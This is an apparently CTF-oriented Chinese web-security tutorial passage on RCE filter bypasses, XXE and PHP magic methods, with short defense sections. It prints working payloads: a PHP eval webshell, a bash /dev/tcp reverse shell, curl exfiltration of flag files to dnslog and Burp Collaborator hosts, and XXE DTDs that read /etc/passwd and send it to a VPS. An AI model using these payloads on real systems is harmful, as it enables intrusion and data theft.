漏扫工具、公开漏洞、手工看参数及功能点\n防御：敏感函数禁用、变量过滤或固定、WAF 产品、容器\n\n\n命令执行：\n\n系统：Linux、Windows、Mac\n产生：Web 源码、中间件平台、其他环境\n检测：白盒 --&gt; 代码审计\n检测：黑盒 --&gt; 漏扫工具、公开漏洞、手工看参数及功能点\n防御：敏感函数禁用、变量过滤或固定、WAF 产品、容器\n\n\n\n二、利用与绕过\n伪协议玩法\n\n\n配合文件包含 伪协议（代码执行）\n123include $_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&#x27;ver&#x27;);?&gt;include $_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=index.php\n\n\n关键词绕过\n\n\n过滤 flag 关键字绕过方式：\n\n\n通配符 绕过：\n12fl*.p*?fl*.ph?\n\n\n转义符 绕过：\n12ca\\t fla\\gcat fl&#x27;&#x27;ag\n\n\n空变量 $*、$@、$x、$&#123;x&#125; 绕过：\n123ca$*t fla$@g  #因为没有设置变量，所以变量为空，从而达成绕过ca$5t fl$5agcat$&#123;2&#125;t f$&#123;2&#125;lag\n\n\n变量拼接法 绕过：\n12a=fl;b=ag;cat$IFS$a$b   $IFS 表示空格\n\n\n反引号 绕过：反引号相当于让字符当作命令执行\n1cat `ls`\n\n\n编码 绕过\n12echo &#x27;flag&#x27; | base64 =&gt; ZmxhZwo=cat `echo Z,xhZwo` | base64 -d\n\n\n组合绝活 绕过\n123456touch &quot;ag&quot;    #创建一个ag文件touch &quot;fl\\\\&quot;  #创建一个fl\\\\文件touch &quot;t \\\\&quot;  #创建一个t文件和根目录下所有文件touch &quot;ca\\\\&quot;  #创建一个ca\\文件ls -t &gt; shell #按照创造时间由进到远文件写入shell文件中sh shell      #执行shell文件\n\n\n\n异或无符号 绕过\n12异或：rce-xor.php &amp; rce-xor.py或：rce-xor-or.php &amp; rce-xor-or.py\n\n\n\n\n过滤函数关键字 绕过方式\n\n\n内敛执行 绕过（如过滤 system）：\n1234echo `ls`echo $(ls)?&gt;&lt;?=`ls`;?&gt;&lt;?=$(ls);\n\n\n过滤执行命令 绕过方式（如 cat、tac 等）：\n12345678910111213141516more #一页一页的显示档案内容less #和more类似tail #查看尾n行nl   #显示的时候，顺便输出行号od   #以二进制的方式读取档案的内容vi   #进入编辑模式查看vim  #进入编辑模式查看nano #进入编辑模式查看sort #可以查看uniq -c #报错出具体内容file -f #报错出具体内容sh /flag 2&gt;%261 #报错出文件内容curl file:///root/f/flag #请求本地内容strings #可以查看bash -v #可以查看rev #可以查看\n\n\n\n\n过滤空格 绕过方式\n1234%09 #url传递参数$IFS拼接法&#123;cat,flag&#125;\n\n\n无回显利用\n利用方式\n\n直接写个文件访问查看是否生成\n让他来访问本地的文件看访问记录： https://forum.ywhack.com/bountytips.php?download\n反弹 shell：https://forum.ywhack.com/shell.php\n延时判断、HTTP请求、DNS请求\n\n延时判断\n\n\n通过sleep()函数，通过延时来判断命令是否有被执行有延时即代表有执行，类似的函数还有benchmark(count,expr)和getlock(str,time)\n\n\nwindows下并没有sleep命令，可以通过回环ping来达到强制延时的效果，linux下同样适用，而且还可以通过ping命令在不同环境下的执行方式来进行判断目标的操作系统类型\n12ping -n 3 127.0.0.1ping -n 4 127.0.0.1\n\n\nHTTP请求\n\n\n目标服务器向个人的公网服务器发起http请求，当该公网服务器收到http请求就代表命令有执行\n\n\n举个例子：\n\n个人的公网服务器使用nc -lvp 7777开始监听\n目标服务器使用curl 公网ip：端口号\n可以看到公网服务器的该端口youhttp请求。（注：ping 命令不产生http请求）\n\n\n\n\nDNS请求\n\n\n如果请求的目标不是ip地址而是域名，那么域名最终还要转化为ip地址，就肯定要做一次域名解析请求。假设有一个可控的二级域名，那么当他发出三级域名解析的时候，就会记录他的域名解析请求，所以配合DNS请求也可以进行命令执行的判断，这一半称为dnslog。（要通过dns请求既可以通过Ping命令，也可以通过curl命令，只要对域名进行访问。让域名服务器进行域名解析就可实现）\n\n\n举个例子：\n\n打开dnslog.cn获得一个域名，访问 777.cflgbs.dnslog.cn ，就会记录下来这个域名解析请求。\n\n\n\n简单测试一下向目标服务器发起http请求，执行下面的命令\n\n1ip=|curl `whoami`.cf1gbs.dnslog.cn\n\n\n查看dnslog\n\n\n\n\n无回显代码执行\n1.执行命令（需要站点目录具有写权限）\n\n通过执行命令，直接将php文件写入到在浏览器可直接读取的文件类型中（如txt文件），然后访问txt文件即可得到php文件内容\n\n（1）使用 cp 命令直接得到文件内容\n1cp flag.php 1.txt\n（2）使用 mv 命令\n1mv flag.php flag.txt\n（3）使用 &gt; 或者 &gt;&gt;\n12cat flag.php &gt; flag.txtcat flag.php &gt;&gt; flag.txt\n（4）使用 tar\n123tar cvf flag.tar flag.php  # 打包flag.php为flag.tartar zcvf flag.tar.gz flag.php  # 压缩flag.php为flag.tar.gz# 解压缩：tar zxvf flag.tar.gz\n（5）使用 zip\n12zip flag.zip flag.php#解压缩：unzip flag.zip\n2.直接写入或外部下载 webshell\n（1）直接写入（需要站点目录具有写权限）\n1echo &quot;&lt;?php @eval(\\$_POST[123]); ?&gt;&quot; &gt; webshell.php\n（2）外部下载（目标服务器可以连接外网或可以通过与攻击机互通，且能执行 wegt 命令）\n12wget 攻击机ip -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名\n3.在 vps 上建立记录脚本\n\n当目标服务器可以向公网服务器发起 http 请求，并且能执行 curl 命令或 wget 命令\n\n（1）在个人公网服务器的根目录构造一个记录脚本：1.php 。\n123456789101112#1.php&lt;?phpheader(&quot;Content-type:text/html; charest=utf-8&quot;);highlight_file(_FILE_);include(&quot;flag.php&quot;);$ip=$_REQUEST[&#x27;ip&#x27;];if($ip)&#123;        shell_exec(&quot;ping -c 4&quot;.$ip);&#125;?&gt;\n（2）在目标服务器的测试点发送任意一条请求进行测试，将获得的 flag 进行 base64 解码即可\n12curl http://*.*.*.**/7.php?data=`cat flag.php|base64`wget http://*.*.*.*/7.php?data=`cat flag.php|base64`\n4.DNSLOG 获取回显\n\n命令执行时要避免空格，空格会导致空格后面的命令执行不到\n将读取的文件命令用反引号``包含起来\n拼接的域名有长度限制\n\n1curl `命令`.域名\n\n举个例子：\n\n1234#用&lt;替换读取文件中的空格，且对输出结果base64编码，然后拼接域名curl `cat&lt;flag.php|base64`.cf1gbs.dnslog.cn#另一种方法curl `cat flag.php|sed s/[[:space:]]//`.cf1gbs.dnslog.cn\n5.反弹 shell\n\n反弹 shell，就是攻击机监听在某个 TCP/UDP 端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机\n\n（1）个人的公网服务器开启端口监听\n1nc -lvp 777\n（2）目标服务器执行命令\n1bash -i &gt;&amp; /dev/tcp/公网机ip/端口号 0&gt;&amp;1\n6.curl 上传文件读取源码\n\n\n使用 curl -F 将flag文件上传到Burp的Collaborator Client。这是一个类似httpslog+dnslog的插件，其功能比dnslog强大，可以不用搭建任何环境去监听dns和http请求，也可以很方便的查看post请求包和cookie等。\n\n\n\n拼接 payload 并在命令执行处提交即可查看 Collaborator Client 收到的数据\n\n\n1ip=|curl -X POST -F xx=@flag.php http://bn2cqaribbwg0qo2ungjlm29i0oqcf.burpcollaborator.net\n实战案例\n\n\n假设有这样一个源码，可以看到这个虽然有命令执行，但是是不会回显的：\n12345&lt;?phperror_reporting(0);highlight_file(__FILE__);$code=$_GET[&#x27;code&#x27;];shell_exec($code);\n\n\n碰到这种，我们就可以使用上面的三种方式去看一看究竟命令有没有执行\n\n\n首先可以通过 dnslog 去看存不存在 RCE，比如这里我的 dns 地址为 http://zv29gw.dnslog.cn，然后我就尝试去让他 ping 这个地址：\n\n\n\n这里成功看到回显\n\n\n\n因此存在 RCE，那我们就尝试去让他反弹 shell，先启动监听：\n\n\n\n然后在棱镜社区去生成一个反弹 shell 的命令\n\n\n三、白盒审计&amp;代码命令执行\n\n这里用 ctfshow 的题目来进行绕过 rce 的演示\n\nWeb29-通配符\n\n\n源码如下：\n12345678910&lt;?php  error_reporting(0);  if(isset($_GET[&#x27;c&#x27;]))&#123;\t$c = $_GET[&#x27;c&#x27;];      if(!preg_match(&quot;/flag/i&quot;, $c))&#123;          eval($c);      &#125;  &#125;else&#123;    \thighlight_file(__FILE__);  &#125;\n\n\n他这里限制了 flag 的大小写，那我们可以通过 fla* 的方式来进行绕过\n\n\npayload: ?c=system('tac fla*');，这里用 tac 是因为 cat 还得看源代码有点麻烦\n\n\nWeb30-取代函数&amp;通配符&amp;管道符\n\n\n源码如下：\n12345678910&lt;?php  error_reporting(0);  if(isset($_GET[&#x27;c&#x27;]))&#123;\t$c = $_GET[&#x27;c&#x27;];      if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;          eval($c);      &#125;        &#125;else&#123;\thighlight_file(__FILE__);  &#125;\n\n\n这里额外限制了 system 和 php，那我们就换个命令执行函数 passthru()\n\n\npayload: ?c=passthru('tac fla*');\n\n\nWeb31-参数逃逸\n\n\n源码如下\n1234567891011&lt;?php  error_reporting(0);  if(isset($_GET[&#x27;c&#x27;]))&#123;      $c = $_GET[&#x27;c&#x27;];      if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123;          eval($c);      &#125;    &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n\n这题相较于上题需要处理的地方就是限制了空格和单引号，那么我们这里可以使用双引号和空格的 URL 编码 %09 进行绕过，payload：?c=passthru(&quot;tac%09fla*&quot;);\n\n\n这题还有另一种办法参数逃逸。\n\n\n什么是参数逃逸呢？指的是攻击者在 只能控制 URL 某个参数（或 HTTP 报文里的某个字段） 的情况下，通过再“造”出新的、不受原有过滤规则约束的参数，从而把恶意指令“逃逸”到这些 新参数 里执行。\n\n\n比如这里我们可以先让 c=eval($_POST[x]);，然后再通过 POST 传入 x=system('tac flag.php');\n\n\nWeb32~36-配合文件包含&amp;伪协议\n\n\n这几道题考的是一个类型的，这里就放到一起了\n\n\n源码如下：\n12345678910&lt;?php  error_reporting(0);  if(isset($_GET[&#x27;c&#x27;]))&#123;\t$c = $_GET[&#x27;c&#x27;];      if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123;          eval($c);      &#125;    &#125;else&#123;\thighlight_file(__FILE__);  &#125;\n\n\n由于这里最关键的过滤了 (，所以我们不能再用函数了，但我们可以使用包含函数 include 去包含传入的文件流，这里因为 include 包含的是一个文件，所以传入的 x 需要是一个 php 文件流，所以我们可以用伪协议去得到一个执行恶意代码的文件流\n\n\npayload：?c=include$_GET[x]?&gt;&amp;x=data://text/plain,&lt;?php system('tac flag.php');?&gt;\n\n\nWeb37~39-包含 RCE&amp;伪协议&amp;通配符\n\n\n源码如下：\n12345678910111213&lt;?php  //flag in flag.php  error_reporting(0);  if(isset($_GET[&#x27;c&#x27;]))&#123;      $c = $_GET[&#x27;c&#x27;];      if(!preg_match(&quot;/flag/i&quot;, $c))&#123;          include($c);          echo $flag;        &#125;  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n\n这里只过滤 flag，所以可以通过通配符、转义符绕过\n\n\n不过这里使用的命令是 include，我们需要改一下 payload\n\n\n最后的 payload 为：data://text/plain,&lt;?php system('tac fla\\g.php');?&gt; 或者 php://input post:&lt;?php system('tac fla*.ph*');?&gt;\n\n\n本地案例-异或无符号\n\n\n源码如下：\n12345678&lt;?php  error_reporting(0);  highlight_file(__FILE__);  $code=$_GET[&#x27;code&#x27;];  if(preg_match(&#x27;/[a-z0-9]/i&#x27;,$code))&#123;      die(&#x27;hacker&#x27;);  &#125;  eval($code);\n\n\n这里过滤了 a-z、0-9 的所有字符，所以基本是什么都干不了了\n\n\n但是我们还是有绕过的办法，就是利用异或/或算法去让某两个无符号的字符异或/或得到一个有符号的字符\n\n\n这里提供了两个脚本直接可以使用，我们就用异或的来演示，首先需要修改条件为 if 语句里的限制条件\n\n\n\n运行脚本，它会生成一个 res_xor.txt 的字典文件\n\n\n打开 python 的脚本，将字典导入进去，运行\n\n\n\n\n四、黑盒测试\n\n\n一般黑盒要么就是 看参数 可能会出现一些 cmd、shell、c、code 的参数，那么这时候可以尝试代码或者命令执行\n\n\n但更多的是 看功能 去发现，或者 配合一些其他漏洞，比如文件上传、文件包含之类的\n\n\n这里有一个案例，比如很多学校和网站都可能有的在线代码执行平台，那这里就是一个天然代码执行的点\n\n\n我们可以尝试让他去执行一些危险函数、命令来看一看它能不能 RCE\n\n\n比如这里我们随便找一个网上的在线平台，然后直接输入命令执行语句：\n\n\n\n比如这里就直接看到了 /etc/passwd 的文件内容，但是这个东西其实也没啥用，因为基本上都是容器，需要配合 docker 逃逸看能不能造成危害\n\n\nXML&amp;XXE漏洞\n一、基础知识\nXML\n\n\nXML（eXtensible Markup Language，可扩展标记语言）是一种由 W3C（万维网联盟）制定的、用于描述结构化数据的标记语言。它本身并不规定具体标签，而是提供一套规则，让用户可以自定义标签和文档结构，从而实现数据的存储、传输和共享。\n\n\n其实可以把它当成一种数据传输的手段，但是同时具备存储的能力，因此其可以用于配置文件、数据交换、文档存储等\n\n\nXML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。等同于 JSON 传输。\n1234567891011&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;users&gt;\t&lt;user&gt;\t\t&lt;username&gt;xiaosedi&lt;/username&gt;\t\t&lt;password&gt;123456&lt;/password&gt;\t&lt;/user&gt;\t&lt;user&gt;\t\t&lt;username&gt;admin&lt;/username&gt;\t\t&lt;password&gt;admin123&lt;/password&gt;\t&lt;/user&gt;&lt;/users&gt;\n\n\nXXE\n原理\n\n\nXXE（XML External Entity Injection，XML 外部实体注入）漏洞是一种针对 XML 解析器的安全漏洞，攻击者通过构造恶意 XML 输入，利用应用程序解析 XML 时未禁用外部实体加载的安全缺陷，导致加载恶意外部文件或发起网络请求，从而可能实现文件读取、命令执行、内网攻击、SSRF（服务器端请求伪造）和 DoS 攻击等危害。\n\n\n在 DTD 中，可以通过 &lt;!ENTITY&gt; 定义实体，其中外部实体（External Entity）允许引用外部资源（如文件或 URL）。当 XML 解析器处理包含外部实体的 XML 时，如果未禁用外部实体加载，就可能加载攻击者指定的外部资源，造成安全漏洞。\n\n\n比如，以下 XML 代码定义了一个外部实体 xxe，指向 /etc/passwd 文件：\n12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;\n\n\n有回显\n\n\n普通文件读取\n12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;login&gt;  &lt;user&gt;&amp;xxe;&lt;/user&gt;  &lt;pass&gt;mypass&lt;/pass&gt;&lt;/login&gt;\n\n\n读取PHP/二进制 --&gt; base64输出（防止解析错误）：\n123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [  &lt;!ENTITY xxe SYSTEM    &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/config.php&quot;&gt;]&gt;&lt;login&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;/login&gt;\n\n\n无回显\n\n\n利用dnslog带外看看是否能执行\n12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [  &lt;!ENTITY xxe SYSTEM &quot;http://YOUR_BURP_COLLAB&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;\n\n\n利用思路就是将数据带出来，在VPS上准备两个文件：\n\n/var/www/html/evil.dtd\n/var/www/html/get.php（写日志）\n\n\n\nevil.dtd：\n123&lt;!ENTITY % all  &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://YOUR_VPS/get.php?data=%file;&#x27;&gt;&quot;&gt;%all;\n\n\nget.php：\n1234&lt;?php$data = $_GET[&#x27;data&#x27;];file_put_contents(&#x27;xxe.log&#x27;, base64_decode($data).&quot;\\n&quot;, FILE_APPEND);?&gt;\n\n\nXXE注入payload：\n1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [  &lt;!ENTITY % file SYSTEM    &quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;&gt;  &lt;!ENTITY % remote SYSTEM &quot;http://test.xxe:999/test.dtd&quot;&gt;  %remote;  %all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt;\n\n\n本地DTD报错回显（不出网）\n\n\n当服务器禁止对外联网但仍需读取文件，可复用目标机器上已有的合法 DTD，触发解析错误带出数据：\n1234567891011121314&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [  &lt;!ENTITY % local_dtd SYSTEM    &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;  &lt;!ENTITY % condition &#x27;aaa)&gt;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM      &#x27;file:///nonexistent/&amp;#x25;file;&#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;    &lt;!ENTITY aa (bb&#x27;&gt;  %local_dtd;]&gt;&lt;message&gt;text&lt;/message&gt;\n\n\n一句话总结\n\n有回显：直接 file:// 或 php://filter，回显即结果。\n无回显：三步曲 → %file 读取 → %remote 引入外部 DTD → %send 外带数据到 VPS。\n\n二、XXE 黑盒发现\n\n\n在黑盒测试的时候，可以通过抓包的形式去判断是否为xml传输\n\n传入的参数格式为xml格式\nContent-Type : application/xml\nBP抓包界面的MIME类型显示为XML\nBP搜索XML关键字（如&lt;?xml）进行匹配\n直接更改Content-Type和传入的格式为xml尝试XXE注入\n\n\n\n那么在这个过程中，可能同样会出现有回显和无回显的情况：\n\n有回显：根据回显直接注入\n无回显：\n\n通过带外查询去验证漏洞的存在\n通过外部实体DTD引用、OOB盲注等方式将查询的内容带出来\n\n\n\n\n\n现在我们就用一个本地的案例来演示这个XXE漏洞，比如现在有个登录框：\n\n\n\n我们尝试登录，然后抓包看一看：\n\n\n\n这里就可以看到是以xml格式传输数据的，并且Content-Type也为xml\n\n\n那么我们就可以继续看看它是否有回显，转到Repeater模块，发包：\n\n\n\n可以看到有回显，那么我们就可以构造恶意的XML实体，去尝试XXE注入了，假设我们D盘下面有一个1.txt文件\n\n\n然后这里可以直接尝试一下读取文件\n\n\n\n并且这里可以通过响应的时间去探测内网端口，如果端口未开放，响应时间会比较长（2.5s左右）；端口开放则在0.5s左右：\n\n\n\n\n三、XXE 白盒审计\n\n\n对于白盒测试，就比黑盒相对简单，因为有代码可以看，一般的测试思路：\n\n通过应用功能追踪代码定位审计\n通过脚本特定函数搜索定位审计\n通过伪协议玩法绕过相关修复等\n\n\n\n其实就是一个从应用本身出发，一个从底层代码出发\n\n\n这里通过PHPSHE来演示如何去进行代码审计，找到漏洞，搭建完毕后是这样一个页面：\n\n\n\n这个XXE漏洞按第一个方法根据功能点是找不到的，因为根本不知道路径，所以我们尝试根据特定函数去找\n\n\n怎么找呢？问AI啊，直接问一下PHP中最常出现XXE漏洞的函数有哪些，然后搜一下看这个源码当中用没用到呗\n\n\n\n\n\n函数 / 类方法\n典型用途\n默认是否加载外部实体\n备注\n\n\n\n\nsimplexml_load_string()\n把 XML 字符串解析成 SimpleXMLElement\n是（libxml &lt; 2.9.0）\n审计/CTF 最常见\n\n\nsimplexml_load_file()\n把 XML 文件解析成 SimpleXMLElement\n同上\n本地或远程文件均可\n\n\nnew SimpleXMLElement($xml, LIBXML_NOENT)\n面向对象版本\n同上\n如传了 LIBXML_NOENT 必触发\n\n\nDOMDocument::loadXML()\nDOM 方式解析 XML 字符串\n同上\n默认同样受 libxml 版本限制\n\n\nDOMDocument::load()\nDOM 方式解析 XML 文件\n同上\n—\n\n\nxml_parse()\n基于 expat 的解析器\n否\nexpat 默认不加载外部 DTD，相对安全\n\n\n\n\n\n一句话总结：\n\n只要看到simlexml_load_string、simplexml_load_file、DOMDocument::loadXML/load等函数，且 libxml版本 &lt; 2.0.0 或未显示禁用实体加载，就可以大胆尝试 XXE Payload\n\n\n\n列出了几个函数，一个一个看源码中有没有，然后慢慢分析：\n\n\n\n这里就存在simplexml_load_string()函数，还可以再看一下前面是否出现libxml_disable)entity_loader(true);设置（不加载外部实体），但这里并没有\n\n\n第一个注释不用管，第二个点进去看看，这里代码太长了，可以先放一放；再看第三个呢，就两行代码：\n1234function pe_getxml() &#123;      $xml = file_get_contents(&quot;php://input&quot;);      return $xml = json_decode(json_encode(simplexml_load_string($xml, &#x27;SimpleXMLElement&#x27;, LIBXML_NOCDATA)), true);  &#125;\n\n\n这里还看到php://input伪协议了，可能需要我们POST传值，返回值为为被解析为字符串的XML\n\n\n然后这里是可能会触发的，那我们看一下那里调用了这个函数：\n\n\n\n然后这里可以找到wechat.hook.php文件中调用了这个函数：\n123function wechat_getxml() &#123;      return pe_getxml();  &#125;\n\n\n这里就一个返回值，那我们可以再找一下哪个地方用到了wechat_getxml()这个函数，于是找到了最初调用的文件notify_url.php：\n\n\n\n这里就可以审计了，就很简单，首先$xml这个参数得到返回值，然后取它的[‘out_trade_no’]键里的值处理后赋给$order_id；然后取[‘transaction_id’]值给$order_outid；之后进行判断，这里都不重要了，重要的是可以看到没有地方输出$xml参数的值，输出的都是些固定的字符串，也就是说，这里很可能是无回显的\n\n\n那么我们先找到这个文件的地址，然后在网页中访问到它，这里可以先看看他的一个路由方式，然后在尝试访问，这里倒没什么路由，直接复制文件路径就访问到了：\n\n\n\n抓个包看一下：\n\n\n\n然后我们随便发送一个测试payload看一看到底有没有回显：\n\n\n\n这里可以很明显的看到可能是有XXE的，但是没有回显，那我们就可以用上面说到的dnslog带外验证一下\n\n\n\n这里用我们上面的payload去看一下能不能访问外部实体，这里它并没有访问，为什么呢？\n\n\n通过查询，原来是PHP版本的问题，这个问题在搭建东西的时候也是经常能遇到，因为php5.6开始引用了libxml2.9.x，所以只有php版本小于5.6才行\n\n\n\n\n然后我们尝试将数据带出来，在VPS上准备两个文件两个文件：test.dtd和get.php\n12&lt;!-- test.dtd --&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://xx.xx.xx.xx/get.php?file=%file;&#x27;&gt;&quot;&gt;\n1234567// get.php&lt;?php$data=$_GET[&#x27;file&#x27;];$myfile = fopen(&quot;file.txt&quot;, &quot;w+&quot;);fwrite($myfile, $data);fclose($myfile);?&gt;\n\n\n然后这里将xx.xx.xx.xx改成自己服务器的地址，整个过程就是将得到的数据当作参数传入file中，然后将这个值写到本地文件里面，实现无回显的利用\n\n\n这里为了方便演示，我就在本地用小皮简易搭建一个服务器，然后访问：\n\n\n\n这里为了避免参数file包含空格、换行符等，尽量采用base64编码，接着就能看到目录下面多了一个file.txt文件：\n\n\n\n\n成功读取到文件内容！\n\n\n四、XXE 黑盒&amp;JS&amp;类型修改\n\n\n有些网站，即使用的JSON或者其他的格式传输数据，但是也可以使用XML去尝试XXE\n\n\n比如这里有个网站地址： http://web.jarvisoj.com:9882/\n\n\n打开是一个输入框，抓包看看数据传输的格式：\n\n\n\n这里采用的是JSON传输，但是这就代表不能使用XXE了吗？我们也可以尝试一下啊，转到Repeater模块，随便发送一个payload：\n\n\n\n好像没什么用，但是我们这里尝试让他的Content-Type=application/xml呢？\n\n\n\n欸，成功读取到了/etc/passwd的内容，你可能会问，这是什么原因呢？因为有什么样的功能就会用到什么样的函数，那什么样的函数就可能造成什么样的漏洞，我们这里可以F12看一看传入的参数做了什么处理：\n\n\n\n很明显的可以看到这里用了一个XMLHttpRequest()函数来处理xml，虽然这个函数本身不太可能触发XXE，但是解析的后端代码可能出现，因为它允许你传入xml的数据，那这时候就只能靠运气了\n\n\n五、XXE 防御手段\n\n\n讲了几个XXE的利用手段和绕过策略，这里讲一下如何去防御XXE，其实它的核心就是”让 XML 解析器永远不要去加载外部实体\n\n\nJava：\n123456DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();f.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);f.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);f.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);f.setXIncludeAware(false);DocumentBuilder b = f.newDocumentBuilder();\n\n\nPHP：\n12345// PHP ≥ 8.0 已废弃 libxml_disable_entity_loader，// 直接设置选项即可libxml_disable_entity_loader(true);   // PHP &lt; 8.0$dom = new DOMDocument();$dom-&gt;loadXML($xml, LIBXML_NONET | LIBXML_NOENT | LIBXML_NOERROR);\n\n\nPython：\n1from lxml import etreexmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities=False))\n\n\n当然也可以去过滤用户提交的XML数据，比如过滤关键字等等\n\n\nPHP反序列化\n一、基础知识\n序列化与反序列化\n原理\n\n序列化：将对象转换为数组或字符串等格式，也可以说是把内存里的对象变成可存储/传输的格式（例如：二进制、JSON、XML）\n反序列化：将数组或字符串等格式转换为对象，或者把格式化的数据再变回内存中的对象\n\n\n\n\n下面是一个简单的序列化数据：\n\n\n\n这里需要注意的是不同访问控制符（public、private、protected）修饰的属性，它的序列化值是不同\n\n\n各编程语言的差异\n\n在PHP中，主要通过serialize()和unserialize()函数来实现序列化与反序列化\n在Java中，原生态的序列化与反序列化主要是靠ObjectOutputStream和ObjectInputStream类来实现的\n而在Python中，原生态的序列化与反序列化操作主要是pickle.dumps()和pickle.loads()函数实现\n这里我们主要是了解PHP的序列化与反序列化操作，之后会详细讲到Java的这部分内容\n\n常见的PHP魔术方法\n什么是魔术方法\n\n魔术方法就是PHP在特定“语法事件”发生时，替你自动调用、名字固定、带双下划线的类成员函数\n\n为什么要学魔术方法\n\n反序列化本身只是把字符串还原成对象，真正导致RCE/文件操作/逻辑绕过的还是字符串还原瞬间或对象销毁瞬间，某些魔术方法被自动触发并执行了危险代码。\n因此如果不掌握这些触发时机，我们就没办法构造POP链，也谈不上利用了\n\n常见的魔术方法\n\n\n\n方法名\n调用条件\n\n\n\n\n__call\n调用不可访问或不存在的方法时被调用\n\n\n__callStatic\n调用不可访问或不存在的静态方法时被调用\n\n\n__clone\n进行对象clone时被调用，用来调整对象的克隆行为\n\n\n__constuct\n构建对象时被调用\n\n\n__debuginfo\n当调用 var_dump() 打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本\n\n\n__destruct\n明确销毁对象或脚本结束时被调用\n\n\n__get\n读取不可访问或不存在属性时被调用\n\n\n__invoke\n当以函数方式调用对象时被调用\n\n\n__isset\n对不可访问或不存在的属性调用 isset() 或 empty() 时被调用\n\n\n__set\n当给不可访问或不存在属性赋值时被调用\n\n\n__set_state\n当调用 var_export() 导出类时，此静态方法被调用，用 __set_state 的返回值作为 var_export 的返回值\n\n\n__sleep\n当使用 serialize 时被调用，当你不需要保存大对象的所有数据时很有用\n\n\n__toString\n当一个类被转换成字符串时被调用\n\n\n__unset\n对不可访问或不存在的属性进行 unset 时被调用\n\n\n__wakeup\n当使用 unserialize 时被调用，可用于做些对象的初始化操作\n\n\n\n__constuct()\n\n\n触发时机：当创建一个新对象的时候会自动调用\n\n\n利用方法：\n123456789101112131415class user &#123;      public $name;      public $age;        public function __construct($name, $age)      &#123;          echo &quot;----构造函数调用----&quot;;          $this-&gt;name = $name;          $this-&gt;age = $age;      &#125;  &#125;    $user = new user(&quot;ling&quot;, 12);// 输出：----构造函数调用----\n\n\n__destruct()\n\n\n触发时机：当对象被销毁时会自动调用，所以这个在反序列化之后一定会被调用\n\n\n利用方法：\n123456789101112131415class user &#123;      public $name;      public $age;        public function __destruct() &#123;          echo &quot;-----析构函数被触发-----\\n&quot;;      &#125;  &#125;    $user = new user();  unserialize(serialize($user));/* 输出：-----析构函数被触发----------析构函数被触发-----*/\n\n\n__sleep()\n\n\n触发时机：serialize()执行时被自动调用，序列化前决定保留哪些属性\n\n\n利用方法：\n1234567891011121314class user &#123;      public $name;      public $age;        public function __sleep()      &#123;          echo &quot;-----sleep函数被调用-----&quot;;          return array(&quot;name&quot;);      &#125;  &#125;    $user = new user();  serialize($user);// 输出：-----sleep函数被调用-----\n\n\n__wakeup()\n\n\n触发时机：unserialize()执行时被自动调用，反序列化之后恢复资源或校验\n\n\n利用方法：\n12345678910111213class user &#123;      public $name;      public $age;        public function __wakeup()      &#123;          echo &quot;-----wakeup函数被调用-----&quot;;      &#125;  &#125;    $user = new user();  unserialize(serialize($user));// 输出: -----wakeup函数被调用-----\n\n\n__invoke()\n\n\n触发时机：当尝试以调用函数的方法调用一个对象时会被自动调用\n\n\n这个方法的作用更像是一个容错处理，因为以调用函数的方法调用一个对象一般都会报错的。不过这类方法本质上并不是为了容错产生的，他们的目的是让你将非法的动作合法化、语义化。\n\n\n利用方法：\n12345678910111213class user &#123;      public $name;      public $age;        public function __invoke()      &#123;          echo &quot;-----invoke函数被调用-----&quot;;      &#125;  &#125;    $user = new user();  $user(&quot;hello&quot;, 1234);// 输出：-----invoke函数被调用-----\n\n\n__toString()\n\n\n触发时机：把类当作字符串使用时自动触发，就是直接将类用echo、print等函数输出时调用\n\n\n利用方法：\n1234567891011121314151617181920class user &#123;      public $name;      public $age;        public function __toString() : string      &#123;          echo &quot;-----toString函数被调用-----\\n&quot;;          return &quot;&quot;;      &#125;  &#125;    $user = new user();  print($user);  echo $user;  printf($user);/* 